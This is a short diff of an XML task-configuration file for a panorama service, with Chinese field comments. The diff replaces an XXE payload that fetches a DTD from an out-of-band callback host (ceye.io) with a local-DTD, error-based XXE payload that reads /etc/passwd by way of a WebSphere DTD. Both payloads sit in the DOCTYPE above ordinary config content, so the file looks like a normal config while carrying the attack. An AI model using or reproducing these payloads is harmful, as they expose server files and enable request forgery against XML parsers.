@@ -1,8 +1,24 @@
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE root [
-<!ELEMENT foo ANY>
-<!ENTITY % remote SYSTEM "http://ip.port.6xfs4n.ceye.io/xxe_test">
-%remote;]>
+<?xml version="1.0" ?>
+
+<!DOCTYPE message [
+
+    <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">
+
+    <!ENTITY % condition 'aaa)>
+
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+
+        &#x25;eval;
+
+        &#x25;error;
+
+        <!ELEMENT aa (bb'>
+
+    %local_dtd;
+
+]>
 <bdpano>
 
     <task name="春季风景全景图" from_url_host="http://www.baidu.com"  > <!--name 必填。需与XR平台所提交的任务名称保持一致。from_url_host 必填。为企业官网主页-->
